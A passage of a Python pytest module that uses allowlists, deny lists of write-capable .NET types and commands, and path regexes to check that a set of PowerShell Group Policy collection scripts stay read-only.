                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            'Write-Host " Account: $account; every $EveryDays day(s) at $At (host local time)"',
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            'Write-Host " Hard time limit: $ExecutionTimeLimit; retain $Retention exports"',
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            "Write-Host \" Output: $OutputRoot; log: $(Join-Path $OutputRoot 'collection.log')\"",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            "Join-Path $OutputRoot 'collection.log'",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            'Write-Host " ZIP delivery: $CopyTo (ingest separately)"',
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "if ($CopyTo) after []",
            ),
        ),
        (
            "Write-Host \"Verify with: Get-ScheduledTaskInfo -TaskName '$TaskName'\"",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            "[timespan]::FromDays(365)",
            ("scriptblock in AttributeAst",),
        ),
        (
            "[timespan]::FromHours(2)",
            (),
        ),
        (
            "[IO.Path]::GetFullPath($Value)",
            (
                "function ConvertTo-GpoLensAbsolutePath",
                "guard if ($Value -match '^(?:[A-Za-z]:[\\\\/]|\\\\\\\\)') -> return",
            ),
        ),
        (
            (
                "[IO.File]::Open((Join-Path $OutputRoot 'collection.lock'), "
                "[IO.FileMode]::OpenOrCreate, [IO.FileAccess]::ReadWrite, [IO.FileShare]::None)"
            ),
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            (
                "[Text.Encoding]::UTF8.GetString($previousBytes).TrimStart([char]0xFEFF).TrimEn"
                'd([char[]]"`r`n")'
            ),
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "if (Test-Path -LiteralPath $marker) after []",
            ),
        ),
        (
            "[Text.Encoding]::UTF8.GetString($previousBytes).TrimStart([char]0xFEFF)",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "if (Test-Path -LiteralPath $marker) after []",
            ),
        ),
        (
            "[Text.Encoding]::UTF8.GetString($previousBytes)",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "if (Test-Path -LiteralPath $marker) after []",
            ),
        ),
        (
            "[string]::Equals($owner, $TaskName, [StringComparison]::OrdinalIgnoreCase)",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "if (Test-Path -LiteralPath $marker) after []",
                "if-condition after []",
            ),
        ),
        (
            "[Text.UTF8Encoding]::new($false).GetBytes($TaskName)",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "try",
            ),
        ),
        (
            "[Text.UTF8Encoding]::new($false)",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "try",
            ),
        ),
        (
            "[IO.File]::Delete($marker)",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "catch []",
                "else of [($null -ne $previousBytes)]",
            ),
        ),
        (
            "$lock.Dispose()",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "finally",
            ),
        ),
        (
            "$PSCmdlet.ShouldProcess($TaskName, 'Unregister collection task')",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "if ($Unregister) after []",
                "if-condition after []",
            ),
        ),
        (
            (
                "[datetime]::TryParseExact($At, 'HH:mm', "
                "[Globalization.CultureInfo]::InvariantCulture, "
                "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                "if-condition after []",
            ),
        ),
        (
            "[IO.Path]::GetFullPath($OutputRoot)",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            (
                '$PSCmdlet.ShouldProcess($TaskName, "Register collection as $account every '
                '$EveryDays day(s) at $At; limit $ExecutionTimeLimit")'
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                "if-condition after []",
            ),
        ),
        (
            "$Credential.GetNetworkCredential()",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "if (-not $GmsaAccount) after []",
                (
                    "guard if (-not $Credential -or $Credential.UserName -ne $ServiceAccount) "
                    "-> throw"
                ),
            ),
        ),
    ),
}

# Variable qualifiers a binding may carry. `$global:` leaks to the caller's
# session; a drive (`${alias:Get-Item}`, `$env:PSModulePath`, `${function:x}`,
# `${variable:x}`, `${C:\file}` — a file write) is a provider write.
_ALLOWED_QUALIFIERS = frozenset({"", "script", "local", "private"})

# PowerShell common parameters that WRITE a named variable; an allowlisted read
# command can thereby rebind a pinned path/exec variable (Sol BL-1). Rejected
# outright (names, their unambiguous prefixes, and the -ov/-pv/... aliases).
_VARIABLE_WRITING_PARAMS = frozenset(
    {"OutVariable", "PipelineVariable", "ErrorVariable", "WarningVariable", "InformationVariable"}
)
# Canonical (full, lowercased) names; the dumper resolves every parameter token
# — including unambiguous prefixes like `-Pi` and aliases like `-ov` — to its
# full name via the cmdlet's real metadata (DeepSeek round 5).
_VARIABLE_WRITING_CANON = frozenset(p.casefold() for p in _VARIABLE_WRITING_PARAMS)

# Instance methods that cause an external side effect (file/AD/registry/object
# mutation or a stream open/write). These require a receiver that is an
# allowlisted, pinned variable; a parenthesized/command receiver (receiver_var
# null) is rejected (Sol BL-2). Pure read/string/collection methods do not.
_SIDE_EFFECTING_METHODS = frozenset(
    {
        "Delete",
        "Open",
        "OpenWrite",
        "OpenRead",
        "Create",
        "CreateEntry",
        "CreateSubdirectory",
        "Write",
        "WriteByte",
        "WriteLine",
        "CopyTo",
        "MoveTo",
        "Replace",
        "SetInfo",
        "CommitChanges",
        "Put",
        "PutEx",
        "Save",
        "SetValue",
        "DeleteValue",
        "InvokeSet",
    }
)
# Methods that end or change the lifetime of a handle/resource. Releasing the
# collection lock early (a duplicate `$lock.Dispose()` before the protected
# block, Sol round-4 BL-3) unprotects everything after it, so these are guarded
# operations too: their count AND control-flow context are pinned.
_LIFETIME_METHODS = frozenset(
    {"Dispose", "Close", "Flush", "Release", "ReleaseMutex", "Unlock", "Lock", "SetLength"}
)

# A pinned root may legitimately be bound by a `foreach ($v in ...)` loop only
# where the real script does so (Run iterates `$archive` over the expired
# exports). Any other foreach binding of a pinned root is a rebind (DeepSeek
# NEW-BL-2), as is a `foreach` whose source carries an absolute/UNC/provider
# path.
FOREACH_ALLOWED_ROOTS: dict[str, frozenset[str]] = {
    "Run-GpoLensCollection.ps1": frozenset({"archive"}),
}
# PowerShell scope prefixes stripped before a pinned-variable lookup, so
# `$script:OutputRoot` / `$global:OutputRoot` cannot dodge the pin (NEW-BL-2).
_SCOPE_PREFIXES = ("script:", "global:", "local:", "private:", "using:", "variable:")

# Every write-path argument must be exactly one of these pinned expressions per
# script (normalized). No free child data: `Join-Path $root $segment`, a
# `$env:` component, a literal/computed `..`, or `New-Item -Name` are not in the
# set and fail (Sol BL-4).
WRITE_TARGET_EXPRESSIONS: dict[str, frozenset[str]] = {
    "Export-GpoEstate.ps1": frozenset(
        {
            "$OutputRoot",
            "$archive",
            "$dest",
            "$testFile",
            '(Join-Path $out "reports\\${safe}__$($gpo.Id).xml")',
            "(Join-Path $out 'AllGPOs.xml')",
            "(Join-Path $out 'collection-errors.json')",
            "(Join-Path $out 'gp-inheritance.json')",
            "(Join-Path $out 'gpo-inventory.json')",
            "(Join-Path $out 'gpo-metadata.json')",
            "(Join-Path $out 'group-members.json')",
            "(Join-Path $out 'ou-tree.json')",
            "(Join-Path $out 'principals.json')",
            "(Join-Path $out 'reports')",
            "(Join-Path $out 'sites.json')",
            "(Join-Path $out 'wmi-filters.json')",
        }
    ),
    "Export-GroupMembers.ps1": frozenset({"$OutputPath"}),
    "Export-Principals.ps1": frozenset({"$OutputPath"}),
    "Run-GpoLensCollection.ps1": frozenset(
        {
            "$CopyTo",
            "$LogPath",
            "$archive.FullName",
            "$delivery",
            "$folder",
            "$newest.FullName",
            "$next",
            "$old",
            "$partial",
            "(Join-Path $OutputRoot 'collection.lock')",
            "(Join-Path $exportDir 'gpo-inventory.json')",
        }
    ),
    "GpoLensCollectionMarker.ps1": frozenset({"$Marker", "$marker"}),
    "Register-GpoLensCollection.ps1": frozenset(
        {"$OutputRoot", "$marker", "(Join-Path $OutputRoot 'collection.lock')"}
    ),
}

# .NET type names (casefolded substrings) that are an AD/COM/WMI/runspace write
# or code-load surface. Rejected wherever they appear (cast, type literal,
# `using`), because such a receiver carries a write under an allowlisted
# instance-method name.
_FORBIDDEN_TYPE_SUBSTRINGS = (
    "adsi",
    "adsisearcher",
    "directoryservices",
    "directoryentry",
    "directorysearcher",
    "wscript",
    "comobject",
    "__comobject",
    "runspace",
    "powershell",
    "scriptblock",
    "wmi",
    "wmiclass",
    "wmisearcher",
    "cimsession",
    "cimclass",
    "ciminstance",
    "managementobject",
    "managementclass",
)

# File-writing commands and the bound parameters that name what they write.
# Move-Item removes its source, so both ends are write targets.
_WRITE_COMMANDS: dict[str, tuple[str, ...]] = {
    "Add-Content": ("Path", "LiteralPath"),
    "Copy-Item": ("Destination",),
    "Move-Item": ("Path", "LiteralPath", "Destination"),
    "New-Item": ("Path",),
    "Out-File": ("FilePath", "LiteralPath"),
    "Remove-Item": ("Path", "LiteralPath"),
    "Rename-Item": ("Path", "LiteralPath"),
    "Set-Content": ("Path", "LiteralPath"),
    "Tee-Object": ("FilePath", "LiteralPath"),
}
# Commands that write only when a path parameter is supplied (Get-GPOReport
# returns a string unless -Path is given — Sol get_gporeport).
_OPTIONAL_PATH_COMMANDS: dict[str, tuple[str, ...]] = {
    "Get-GPOReport": ("Path",),
}
# Static methods whose first argument is a path that may be created/written/deleted.
_WRITE_STATIC = {
    "IO.File::AppendAllText",
    "IO.File::Delete",
    "IO.File::Open",
    "IO.File::WriteAllBytes",
    "IO.File::WriteAllText",
    "IO.Compression.ZipFile::Open",
}
# New-Item item types that create a filesystem object other than a plain file or
# directory (a symlink/junction to SYSVOL re-points a confined root — Sol
# set_itemtype).
_FORBIDDEN_ITEM_TYPES = {"symboliclink", "junction", "hardlink"}
# Casefolded views of the tables above (names are canonicalized on load).
_WRITE_COMMANDS_CF = {
    k.casefold(): tuple(p.casefold() for p in v) for k, v in _WRITE_COMMANDS.items()
}
_OPTIONAL_PATH_COMMANDS_CF = {
    k.casefold(): tuple(p.casefold() for p in v) for k, v in _OPTIONAL_PATH_COMMANDS.items()
}
# A variable reference in source text: `$name`, `$scope:name`, `$drive:name` or
# `${...}`. Scope prefixes are stripped by _bare_var; a drive (env:) is kept.
_VARIABLE = re.compile(r"\$(?:\{([^}]+)\}|((?:[A-Za-z_][A-Za-z0-9_]*:)?[A-Za-z_][A-Za-z0-9_]*))")
# In a write TARGET (built from roots) any drive-qualified or UNC or `..` literal
# is illegitimate, including a single drive letter.
_ABSOLUTE_LITERAL = re.compile(r"[A-Za-z]:[\\/]|\\\\|(?:^|[\\/'\" ])\.\.(?:[\\/'\" ]|$)")
# A non-filesystem PowerShell provider qualifier (registry, cert, AD, env, ...).
_PROVIDER = re.compile(
    r"\b(?:HKLM|HKCU|HKCR|HKU|HKEY_[A-Z_]+|Cert|WSMan|Env|Variable|Function|Alias|AD):",
    re.IGNORECASE,
)
# In a parameter default or foreach source an absolute *filesystem* path is fine
# (it is the root itself); only UNC, a provider, or `..` are rejected.
_UNC_OR_DOTDOT = re.compile(r"\\\\|(?:^|[\\/'\" ])\.\.(?:[\\/'\" ]|$)")


def _cf(name: str) -> str:
    return name.casefold()


def _bare_var(name: str) -> str:
    """Casefold a variable name with any scope prefix stripped.

    ``$script:OutputRoot`` -> ``outputroot`` so a scoped assignment cannot dodge
    the pinned-variable lookup (DeepSeek NEW-BL-2).
    """
    cf = _cf(name)
    for prefix in _SCOPE_PREFIXES:
        if cf.startswith(prefix):
            return cf[len(prefix) :]
    return cf


def _vars_in(text: str | None) -> set[str]:
    return {_bare_var(a or b) for a, b in _VARIABLE.findall(text or "")}


def _normalize_type(name: str) -> str:
    """Canonical (casefolded, ``System.``-less) .NET type name."""
    cf = _cf(name)
    return cf[len("system.") :] if cf.startswith("system.") else cf


def _cfset(names: Any) -> frozenset[str]:
    return frozenset(_cf(n) for n in names)


def _method_key(type_name: str | None, member: str | None) -> str:
    return f"{_normalize_type(type_name or '')}::{_cf(member or '')}"


_WRITE_STATIC_CF = frozenset(_method_key(*k.split("::")) for k in _WRITE_STATIC)


def _canonicalize(entry: dict[str, Any]) -> dict[str, Any]:
    """Casefold every command, function, parameter, member, type and variable
    name in the semantic projections, once, as the inventory is loaded.

    PowerShell resolves all of these case-insensitively, so every comparison in
    the checks below is made against casefolded policy tables (adcs-lens found
    `_WRITEJSON` passing a check written for `_writeJson`). Source TEXT fields
    (binding right-hand sides, operation text, guard conditions) are left as
    written: they are compared verbatim, so a re-cased copy of a pinned
    expression is a new value and fails closed. ``ast_rows`` keep the source
    spelling (the golden records it).
    """
    if "commands" not in entry:
        return entry  # -AstOnly / -Sites records
    for command in entry["commands"]:
        if command["name"]:
            command["name"] = _cf(command["name"])
        command["function"] = _cf(command["function"])
        command["bound"] = {_cf(k): v for k, v in command["bound"].items()}
        for arg in command["arguments"]:
            if arg["parameter"]:
                arg["parameter"] = _cf(arg["parameter"])
    for member in entry["members"]:
        member["function"] = _cf(member["function"])
        for key in ("member", "type", "receiver_var"):
            if member[key]:
                member[key] = _cf(member[key])
    entry["functions"] = [_cf(n) for n in entry["functions"]]
    for fn in entry["function_params"]:
        fn["name"] = _cf(fn["name"])
        fn["params"] = [_cf(n) for n in fn["params"]]
        fn["pipeline_params"] = [_cf(n) for n in fn["pipeline_params"]]
    for binding in entry["variable_assignments"]:
        binding["name"] = _cf(binding["name"])
        binding["function"] = _cf(binding["function"])
    for ref in entry["variable_refs"]:
        ref["name"] = _cf(ref["name"])
        ref["drive"] = _cf(ref["drive"])
    for use in entry["variable_uses"]:
        use["name"] = _bare_var(use["name"])
        use["function"] = _cf(use["function"])
    for decl in entry["parameter_decls"]:
        decl["name"] = _cf(decl["name"])
        decl["function"] = _cf(decl["function"])
    for cond in entry["conditions"]:
        cond["function"] = _cf(cond["function"])
    for pin in entry["pipeline_inputs"]:
        pin["function"] = _cf(pin["function"])
    for key in ("member_assignments", "index_assignments"):
        for item in entry[key]:
            item["function"] = _cf(item["function"])
            var = "receiver_var" if key == "member_assignments" else "root_var"
            if item[var]:
                item[var] = _cf(item[var])
    return entry


# ---------------------------------------------------------------------------
# Variable bindings (round-3 BL-2 / NEW-BL-1 / NEW-BL-3). Every way a variable
# can acquire a value is reduced to a binding key string:
#   "= <rhs>" / "+= <rhs>" ...   assignment (any operator)
#   "param" / "param <default>"  parameter declaration
#   "foreach <source>"           foreach loop variable
#   "ref <call>"                 [ref]$v handed to a call that may write it
#   "incdec <op>"                ++/--
#   "multi <rhs>"                $a, $b = ... (multiple assignment)
#   "arg <expr>"                 a local-function call site binds the parameter
#   "splat @<var>"               a splatted call may bind the parameter
#   "pipeline"                   a ValueFromPipeline parameter
#   "common -<Param>"            -OutVariable/-ErrorVariable/... writes it
#   "member <target> = <rhs>"    a property write on the variable's object
#   "index <target>"             an index write on the variable's object
# Every key is prefixed with the scope that makes the binding, `[<function>]`
# or `[script]` (a ForEach-Object/Where-Object/.ForEach() scriptblock runs in
# its caller's scope, so it is attributed to the enclosing function; a call-site
# argument belongs to the callee's scope). A pinned binding copied into another
# function is therefore a new key. Variable names are casefolded with scope
# prefixes (`$script:`) stripped.
# ---------------------------------------------------------------------------

_ASSIGN_OPERATORS = {
    "Equals": "=",
    "PlusEquals": "+=",
    "MinusEquals": "-=",
    "MultiplyEquals": "*=",
    "DivideEquals": "/=",
    "RemainderEquals": "%=",
    "QuestionQuestionEquals": "??=",
}
# PowerShell common parameters an advanced function accepts implicitly.
_COMMON_PARAMETERS = (
    "Debug",
    "ErrorAction",
    "ErrorVariable",
    "InformationAction",
    "InformationVariable",
    "OutBuffer",
    "OutVariable",
    "PipelineVariable",
    "ProgressAction",
    "Verbose",
    "WarningAction",
    "WarningVariable",
    "WhatIf",
    "Confirm",
)


def _binding_key(binding: dict[str, Any]) -> str:
    kind = binding["kind"]
    rhs = _norm(binding["rhs"])
    if kind == "assign":
        op = _ASSIGN_OPERATORS.get(binding["operator"], binding["operator"])
        return f"{op} {rhs}"
    if kind == "param":
        return f"param {rhs}".rstrip()
    if kind == "incdec":
        return f"incdec {binding['operator']}"
    return f"{kind} {rhs}".rstrip()


def _resolve_param(token: str, params: list[str]) -> str | None:
    """The parameter a `-token` binds to (exact name, else unique prefix)."""
    cf = _cf(token)
    exact = [p for p in params if _cf(p) == cf]
    if exact:
        return exact[0]
    prefixed = [p for p in params if _cf(p).startswith(cf)]
    return prefixed[0] if len(prefixed) == 1 else None


def _callable_functions(script: str, inv: dict[str, dict[str, Any]]) -> dict[str, dict[str, Any]]:
    """casefolded name -> function_params record, for in-file and dot-sourced functions."""
    found: dict[str, dict[str, Any]] = {}
    for source in (script, *POLICIES[script].dot_sources):
        for fn in inv[source]["function_params"]:
            found[_cf(fn["name"])] = fn
    return found


def _scope(function: str | None) -> str:
    return f"[{_cf(function)}]" if function else "[script]"


def _call_site_bindings(
    script: str, inv: dict[str, dict[str, Any]]
) -> tuple[list[tuple[str, str]], list[str]]:
    """([(param, scoped binding key)], [unresolvable call-site arguments])."""
    functions = _callable_functions(script, inv)
    bindings: list[tuple[str, str]] = []
    unresolved: list[str] = []
    for command in inv[script]["commands"]:
        fn = functions.get(_cf(command["name"] or ""))
        if fn is None:
            continue
        params: list[str] = list(fn["params"])
        scope = _scope(fn["name"])
        explicit: set[str] = set()
        positional: list[str] = []
        splats: list[str] = []
        for arg in command["arguments"]:
            value = arg["value"]
            if arg["parameter"] is None:
                if arg["value_kind"] == "VariableExpressionAst" and str(value).startswith("@"):
                    splats.append(str(value))
                else:
                    positional.append(_norm(value))
                continue
            param = _resolve_param(str(arg["parameter"]), params)
            if param is None:
                if _resolve_param(str(arg["parameter"]), list(_COMMON_PARAMETERS)) is not None:
                    continue  # common parameter; variable-writing ones are checked separately
                unresolved.append(f"line {command['line']}: {command['name']} -{arg['parameter']}")
                continue
            explicit.add(param)
            bindings.append(
                (
                    param,
                    f"{scope} arg {_norm(value)}" if value is not None else f"{scope} arg switch",
                )
            )
        free = [p for p in params if p not in explicit]
        for i, value in enumerate(positional):
            if i < len(free):
                bindings.append((free[i], f"{scope} arg {value}"))
            else:
                bindings.append(("args", f"{scope} arg {value}"))
        for splat in splats:
            for param in free:
                bindings.append((param, f"{scope} splat {splat}"))
        for param in fn["pipeline_params"]:
            bindings.append((param, f"{scope} pipeline"))
    return bindings, unresolved


def _all_bindings(script: str, inv: dict[str, dict[str, Any]]) -> dict[str, set[str]]:
    entry = inv[script]
    out: dict[str, set[str]] = {}

    def add(name: str, key: str) -> None:
        out.setdefault(_bare_var(name), set()).add(key)

    for binding in entry["variable_assignments"]:
        if _bare_var(binding["name"]) == "null":
            continue  # `$null = ...` discards output; it cannot rebind anything
        add(binding["name"], f"{_scope(binding['function'])} {_binding_key(binding)}")
    params, _ = _call_site_bindings(script, inv)
    for param, key in params:
        add(param, key)
    for write in _common_param_writes(entry):
        add(write["target"], f"{_scope(write['function'])} common -{write['parameter']}")
    for member in entry["member_assignments"]:
        if member["receiver_var"]:
            add(
                member["receiver_var"],
                f"{_scope(member['function'])} member {_norm(member['target'])}",
            )
    for index in entry["index_assignments"]:
        if index["root_var"]:
            add(index["root_var"], f"{_scope(index['function'])} index {_norm(index['target'])}")
    return out


# Variables the engine sets that a pinned value may read without being pinned
# itself. None of them may be bound by the scripts (check_bindings refuses any
# binding of an automatic/preference variable that is not in SPECIAL_BINDINGS).
_AUTO_READ_OK = frozenset(
    {
        "_",
        "psitem",
        "true",
        "false",
        "null",
        "psscriptroot",
        "pscmdlet",
        "myinvocation",
        "pid",
        "lastexitcode",
        "matches",
        "env:systemroot",
    }
)


def _required_vars(script: str, inv: dict[str, dict[str, Any]]) -> dict[str, str]:
    """Variables whose every binding must be pinned, with the first reason.

    Roots: write roots, variables in pinned write-target expressions, receivers
    of every instance-method call / property write / index write, splatted
    variables, every variable read by any command argument, .NET call argument
    or branch/loop condition, and dot-sourced function parameters pinned by
    their defining script. Then the closure: every variable read by any
    binding of a required variable. check_pinned_bindings requires PINNED_VARS
    to cover this set exactly.
    """
    entry = inv[script]
    reasons: dict[str, str] = {}

    def need(name: str | None, why: str) -> None:
        if not name:
            return
        bare = _bare_var(name)
        if bare not in reasons:
            reasons[bare] = why

    for root in WRITE_ROOTS[script]:
        need(root, "write root")
    for expr in sorted(WRITE_TARGET_EXPRESSIONS[script]):
        for var in sorted(_vars_in(expr)):
            need(var, f"write target {expr}")
    for member in entry["members"]:
        if not member["static"]:
            need(member["receiver_var"], f"receiver of .{member['member']}()")
    for member in entry["member_assignments"]:
        need(member["receiver_var"], f"property write {member['target']}")
    for index in entry["index_assignments"]:
        need(index["root_var"], f"index write {index['target']}")
    for ref in entry["variable_refs"]:
        if ref["splatted"]:
            need(ref["name"], "splatted")
    # Every variable read by ANY command argument, .NET call argument or
    # branch/loop condition (Sol round 6: `$metaPath = '\\host\share\x'` left
    # `Get-Content -LiteralPath $metaPath` textually pinned but reading a remote
    # path; `$Unregister = $true` flipped the guard of Unregister-ScheduledTask).
    for command in entry["commands"]:
        if not command["name"]:
            for var in sorted(_vars_in(command["text"])):
                need(var, f"dynamic invocation {_norm(command['text'])}")
        for arg in command["arguments"]:
            for var in sorted(_vars_in(arg["value"])):
                need(var, f"argument of {command['name'] or 'a dynamic invocation'}")
    for member in entry["members"]:
        for text in member["arguments"]:
            for var in sorted(_vars_in(text)):
                need(var, f"argument of .{member['member']}()")
    for cond in entry["conditions"]:
        for var in sorted(_vars_in(cond["text"])):
            need(var, f"condition {cond['text'][:60]}")
    for pin in entry["pipeline_inputs"]:
        for var in sorted(_vars_in(pin["text"])):
            need(var, f"pipeline input {pin['text'][:60]}")
    for source in POLICIES[script].dot_sources:
        for fn in inv[source]["function_params"]:
            for param in fn["params"]:
                if param in PINNED_VARS[source]:
                    need(param, f"parameter of {fn['name']} (pinned in {source})")
    bindings = _all_bindings(script, inv)
    pending = list(reasons)
    while pending:
        var = pending.pop()
        for key in sorted(bindings.get(var, set())):
            for ref in sorted(_vars_in(key)):
                if ref not in reasons:
                    reasons[ref] = f"read by a binding of ${var}"
                    pending.append(ref)
    return {var: why for var, why in reasons.items() if var not in _AUTO_READ_OK}


def _pwsh() -> str:
    exe = shutil.which("pwsh")
    if exe is None:
        if os.environ.get("CI"):
            pytest.fail("pwsh is required in CI for the collector read-only gate")
        pytest.skip("pwsh not installed; CI runs this gate (ubuntu runners ship pwsh)")
    return exe


def _run_dumper_raw(exe: str, paths: list[str], *flags: str, timeout: int = 120) -> Any:
    result = subprocess.run(
        [exe, "-NoProfile", "-NonInteractive", "-File", str(_DUMPER), *flags, *paths],
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
    )
    assert result.returncode == 0, result.stderr
    return json.loads(result.stdout)


def _run_dumper(exe: str, paths: list[str]) -> dict[str, dict[str, Any]]:
    return {Path(e["path"]).name: _canonicalize(e) for e in _run_dumper_raw(exe, paths)}


@cache
def _inventory_for(exe: str) -> dict[str, dict[str, Any]]:
    return _run_dumper(exe, [str(_SCRIPTS / name) for name in sorted(POLICIES)])


@pytest.fixture(scope="module")
def inventory() -> dict[str, dict[str, Any]]:
    return _inventory_for(_pwsh())


def _exact(kind: str, script: str, used: set[str], allowed: frozenset[str]) -> None:
    unexpected = sorted(used - allowed)
    unused = sorted(allowed - used)
    assert not unexpected, f"{script}: {kind} outside the read-only allowlist: {unexpected}"
    assert not unused, f"{script}: stale {kind} allowlist entries (remove them): {unused}"


# ---------------------------------------------------------------------------
# Check functions. Each raises AssertionError on a violation. The per-script
# tests below call them against the real scripts; the regression suite calls
# run_all_checks against modified copies and asserts a failure.
# ---------------------------------------------------------------------------


def check_commands(script: str, entry: dict[str, Any], local: set[str]) -> None:
    policy = POLICIES[script]
    named = {c["name"] for c in entry["commands"] if c["name"]}
